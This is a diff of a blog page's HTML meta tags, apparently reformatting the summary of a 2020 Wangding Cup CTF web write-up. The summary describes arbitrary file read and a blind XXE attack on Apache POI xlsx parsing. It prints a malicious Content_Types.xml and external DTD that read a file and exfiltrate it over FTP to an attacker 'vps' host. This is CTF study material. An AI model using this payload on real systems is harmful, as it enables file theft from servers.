@@ -113,7 +113,7 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
 新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
 &lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
 &lt;!ENTITY % param3 &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;ftp://vps/%data3;&#39;&gt;&#34;&gt; vps上开启ftp监听脚本, 脚本如下">
-  <meta property="og:locale" content="en-us">
+  <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2020-05-11T16:11:31+00:00">
@@ -121,39 +121,16 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
     <meta property="og:image" content="https://dragonbox.top/image-20211114142107501.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://dragonbox.top/image-20211114142107501.png">
-<meta name="twitter:title" content="网鼎杯2020 web">
-<meta name="twitter:description" content="filejava
-提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
-
+  <meta name="twitter:title" content="网鼎杯2020 web">
+  <meta name="twitter:description" content="filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
 绝对路径
-/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
-读文件/etc/passwd
-
+/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
 读日志文件 logs/catalina.out
-​        
-发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
-        if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName))
-          try {
-            Workbook wb1 = WorkbookFactory.create(in);
-            Sheet sheet = wb1.getSheetAt(0);
-            System.out.println(sheet.getFirstRowNum());
-          } catch (InvalidFormatException e) {
-            System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;);
-            e.printStackTrace();
-          }  
-这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
+​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
+if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
 新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
-&lt;?xml version=&#34;1.0&#34;?&gt;
-&lt;!DOCTYPE r [
-&lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt;
-&lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt;
-%sp;
-%param3;
-%exfil;
-]&gt;
-在vps上的web目录下面放置一个ext.dtd, 内容如下:
-&lt;!ENTITY % param3 &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;ftp://vps/%data3;&#39;&gt;&#34;&gt;
-vps上开启ftp监听脚本, 脚本如下">
+&lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
+&lt;!ENTITY % param3 &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;ftp://vps/%data3;&#39;&gt;&#34;&gt; vps上开启ftp监听脚本, 脚本如下">
 
 
 <script type="application/ld+json">
